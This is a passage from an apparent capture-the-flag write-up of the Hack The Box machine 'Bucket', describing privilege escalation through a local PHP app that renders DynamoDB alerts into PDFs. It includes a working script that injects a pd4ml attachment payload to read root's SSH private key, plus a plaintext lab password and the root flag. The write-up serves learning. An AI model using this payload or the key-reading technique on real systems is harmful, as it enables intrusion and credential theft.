udp        0      0 localhost:60184         localhost:domain        ESTABLISHED
udp        0      0 10.10.10.212:42214      1.0.0.1:domain          ESTABLISHED
```

Interestingly, `netstat` does not show a crucial service - the local web application running on port 8000. I would discover this by accident when I tried to start my own with `php -S localhost:8000` later on, and was told the port was already in use. Luckily, running `ss -lntp` instead reveals the server:

```bash
roy@bucket:/var/www/bucket-app/files$ ss -lntp
State                Recv-Q               Send-Q                             Local Address:Port                              Peer Address:Port              Process                                      
LISTEN               0                    511                                    127.0.0.1:8000                                   0.0.0.0:*                                                              
LISTEN               0                    4096                                   127.0.0.1:9999                                   0.0.0.0:*                  users:(("php",pid=31321,fd=4))              
LISTEN               0                    4096                                   127.0.0.1:39185                                  0.0.0.0:*                                                              
LISTEN               0                    4096                               127.0.0.53%lo:53                                     0.0.0.0:*                                                              
LISTEN               0                    4096                                   127.0.0.1:4566                                   0.0.0.0:*                                                              
LISTEN               0                    128                                      0.0.0.0:22                                     0.0.0.0:*                                                              
LISTEN               0                    511                                            *:80                                           *:*                                                              
LISTEN               0                    128                                         [::]:22                                        [::]:*                                   
```

It also doesn't show up in `ps aux`, so there is no way to verify which user it runs as. We later find out it has root privileges, and there is one `/usr/sbin/apache2 -k start` process running as root, so I suspect that is the underlying process that started the server.

After looking at some other writeups, it seems `netstat -tnl` would have revealed the webserver. An alternative would have been to look in `/etc/apache2/sites-enabled/000-default.conf` to see what sites are enabled on the box. [0xdf's writeup](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html#web-1) explains this process.

### Linpeas

I did run Linpeas, but it didn't throw up much useful information.

```bash
roy@bucket:~$ wget http://10.10.14.65/linpeas.sh
roy@bucket:~$ ./linpeas.sh
```

The highlights were the presence of the `.aws` directory, which we had already found, and a potential `at` exploit.

```bash
[+] Unexpected folders in root
/cdrom
/.aws

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)

```

However, I suspected this wasn't the path to root, and it would instead be something to do with AWS or the local application that we found slightly earlier.

## bucket-app

There is a php-based web app in this directory:

```bash
roy@bucket:~/project/vendor$ cd /var/www/bucket-app
roy@bucket:/var/www/bucket-app$ ls -la
total 856
drwxr-x---+  4 root root   4096 Feb 10 12:29 .
drwxr-xr-x   4 root root   4096 Feb 10 12:29 ..
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Feb 10 12:29 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10 12:29 vendor
```

Besides an amusing misspelling of skyscraper, the PHP code at the top is the only interesting part:

![PHP code with highlighted sections](/assets/images/blogs/Pasted image 20210429102509.png)

It seems to create a PDF file using the contents of a file on the box. It reads which file to turn into a PDF from the database' `alerts` table - which does not currently exist.

There are a few steps here - it seems the path to root involves inserting some malicious data into the database with the title "Ransomware", then triggering the server to create a PDF using the `data` attribute supplied. If the server is running as root, we can use it to read a sensitive file. To trigger this, we need to send it a `POST` request.

I have left out a lot of details regarding debugging and troubleshooting steps I made - however, there are still a few necessary steps before the exploit works, including creating the alerts table. However, you can still [skip to the final payload](#final-payload---downloading-root-private-key) if you wish.

### Accessing the Local Site

When I first did this box, I missed the fact that the local webserver was already running at first, and tried to start my own on port 9999 with `php -S localhost:9999`. This sent me down a rabbit hole when, in the final step, my exploit could not access the root flag (as it was running as `roy`).

Being aware of this mistake, when I redid this box I knew I had to instead setup an SSH tunnel from my local host to port 8000 on the remote machine. To do this we use the following command and input the password `n2vM-<_K_Q:.Aa2`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ ssh -L 8000:localhost:8000 roy@10.10.10.212
roy@10.10.10.212's password: 
...[snip]...
roy@bucket:~$
```

Now we can navigate to `localhost:8000` and view the 'local' site on the remote machine!

![Seeing the bucket app staging site](/assets/images/blogs/Pasted image 20210429110814.png)

### Testing the Web App

Now we can send requests to the server from our box, and see the response in our SSH terminal tab.

*Note:* this debugging used the PHP server that was running as `roy` from my first attempt at this box. While setting this up was initially a mistake, it proved extremely useful in debugging the application, as it allowed me to see error messages. However, making this PHP server is not necessary to complete the box. It also requires tunneling to whatever port roy's server is using, rather than to port 8000, using the command `ssh -L 8000:localhost:X roy@10.10.10.212`.

For example, let's test the basic `POST` functionality. Then we can start to debug it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ curl -d 'action=get_alerts' localhost:8000
```

On our SSH connection to `roy` we see:

```bash
[Thu Apr 29 10:21:14 2021] 127.0.0.1:59706 [500]: POST / - Uncaught Aws\Exception\CredentialsException: Cannot read credentials from /home/roy/.aws/credentials in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php:838
Stack trace:
#0 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php(516): Aws\Credentials\CredentialProvider::reject()
#1 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Middleware.php(121): Aws\Credentials\CredentialProvider::Aws\Credentials\{closure}()
#2 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/RetryMiddleware.php(275): Aws\Middleware::Aws\{closure}()
#3 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Middleware.php(206): Aws\RetryMiddleware->__invoke()
#4 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/StreamRequestPayloadMiddleware.php(83): Aws\Middleware::Aws\{closure}()
#5 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/EndpointParameterMiddleware.php(87): Aws\StreamRequestPayloadMiddleware->__invoke()
#6 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/ClientResolver.php(690): Aws\Endp in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php on line 838
```

So let's configure roy some arbitrary credentials:

```bash
roy@bucket:~$ aws configure
AWS Access Key ID [None]: 123123213
AWS Secret Access Key [None]: 123123123
Default region name [None]: us-east-1
Default output format [None]: 
```

Now when we send the request above, we get a different error instead:

```bash
[Thu Apr 29 10:23:24 2021] PHP Fatal error:  Uncaught exception 'Aws\DynamoDb\Exception\DynamoDbException' with message 'Error executing "Scan" on "http://localhost:4566"; AWS HTTP error: Client error: `POST http://localhost:4566` resulted in a `400 Bad Request` response:
{"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent (truncated...)
 ResourceNotFoundException (client): Cannot do operations on a non-existent table - {"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent table"}'

GuzzleHttp\Exception\ClientException: Client error: `POST http://localhost:4566` resulted in a `400 Bad Request` response:
{"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent (truncated...)
 in /var/www/bucket-app/vendor/guzzlehttp/guzzle/src/Exception/RequestException.php:111
Stack trace:
#0 /var/www/bucket-app/vendor/guzzlehttp/guzzle/src/Middleware.php(66): GuzzleHttp\Ex in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/WrappedHttpHandler.php on line 195
```

This is progress!

#### Creating the Alerts Table

We can verify using the AWS CLI that the `alerts` table doesn't exist:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
{
    "TableNames": [
        "users"
    ]
}
```

I did some experimenting with DDB's `create-table` function and settled on the following command:

```
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```

AWS' [DDB documentation](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html) was very helpful here. The key parts of the command are as follows:
- `table-name alerts` creates our alerts table
- `--key-schema AttributeName=title,KeyType=HASH` defines our primary key as the `title` field. It is the only field referenced in the PHP code, so I just set it as the primary key
	- (I initially tried setting a separate primary key and having a separate `title` attribute, but the number of keys needs to match the number of attributes, so I stripped it down to just one)
- `-attribute-definitions AttributeName=title,AttributeType=S` creates a `title` attribute with the type `S` (string)
- The `--provisioned-throughput` parameter makes little difference, but is required

You can use either your local machine or the SSH connection to do this command - you just need to change the `--endpoint-url`. For example, when I first did this box I was trying to hit `localhost:4566` as the endpoint URL from my Kali machine, and went down a long rabbit hole. Using the URL in the above command worked fine from kali, but if you wanted to execute this command in your SSH session you could do the following:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1619692610.834,
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": 0.0,
            "LastDecreaseDateTime": 0.0,
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
```

We can then verify the table has been created:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
{
    "TableNames": [
        "alerts",
        "users"
    ]
}
```

Excellent.

### Scripting the Process

Trying to re-run our `curl` command again threw the non-existent table error, and re-running `list-tables` showed it had been deleted. This suggests there is a cleanup script running on the box. We could verify this by running `pspy`, but I will take it as a given.

In our script we want to create the table, and then immediately put a malicious item in it. Let's start with listing the tables, then we can figure out our payload:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ddb]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```

Running this successfully creates our table.

#### Creating a Malicious Alert

Now we need to create an alert that will read a sensitive file. Looking at the code, the `title` field needs to equal "Ransomware", and then we can put whatever we like in the `data` field.

We use the `put-item` method to do this. [Reading the docs](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/put-item.html) explains how to do this, and the method allows us to set our `data` attribute.

Let's go with `/root/.ssh/id_rsa` to read their private key.

Here's our initial script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ddb]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
aws --endpoint-url=http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{ "title": {"S": "Ransomware"},"data": {"S": "/root/.ssh/id_rsa"} }' --return-consumed-capacity TOTAL
aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name alerts

curl -X POST -d 'action=get_alerts' localhost:8000
sleep 0.5
wget localhost:8000/files/result.pdf
```

However, this does not work. We can't simply ask it to grab the ssh key - we need to put in a bit of extra work, and take a closer look at the Java `pd4ml` library. 

## Final Payload - Downloading Root Private Key

Specifically, we can use `pd4ml` to [create an attachment](https://pd4ml.com/cookbook/pdf-attachments.htm) in the PDF.

So now we update our `data` tag:

```
"data": {"S": "<html><pd4ml:attachment src='file:///root/.ssh/id_rsa' description='attachment sample' icon='Paperclip'/>"}
```

And we can use this as our malicious payload. We just have to escape some quotation marks:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/writeup_attempt]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
aws --endpoint-url=http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{ "title": {"S": "Ransomware"},"data": {"S": "<html><pd4ml:attachment src=\"file:///root/.ssh/id_rsa\" description=\"attachment sample\" icon=\"Paperclip\"/>"} }' --return-consumed-capacity TOTAL
aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name alerts

curl -X POST -d 'action=get_alerts' localhost:8000
sleep 0.5
wget localhost:8000/files/result.pdf
```

And then run our script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/writeup_attempt]
└─$ ./create-and-curl 
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2021-04-29T12:54:29.454000+01:00",
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": "1970-01-01T00:00:00+00:00",
            "LastDecreaseDateTime": "1970-01-01T00:00:00+00:00",
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}
{
    "Items": [
        {
            "title": {
                "S": "Ransomware"
            },
            "data": {
                "S": "<html><pd4ml:attachment src=\"file:///root/.ssh/id_rsa\" description=\"attachment sample\" icon=\"Paperclip\"/>"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
--2021-04-29 12:43:23--  http://localhost:8000/files/result.pdf
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19338 (19K) [application/pdf]
Saving to: ‘result.pdf.1’

result.pdf.1                                       100%[=============================================================================================================>]  18.88K  --.-KB/s    in 0s      

2021-04-29 12:43:23 (58.1 MB/s) - ‘result.pdf.1’ saved [19338/19338]
```

This outputs a pdf into our local filesystem:

![Seeing a PDF file in our folder with a paperclip icon](/assets/images/blogs/Pasted image 20210429124611.png)

Clicking the paperclip gives us the SSH key!

![An SSH key as an attachment](/assets/images/blogs/Pasted image 20210429124714.png)

We can copy and paste and save this key, then SSH in as root:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ ssh -i root_ssh root@10.10.10.212
...[snip]...
root@bucket:~# cat root.txt 
d2d9f1dd102ca4d5bd9b9ebf62e3f604
```

That's the box!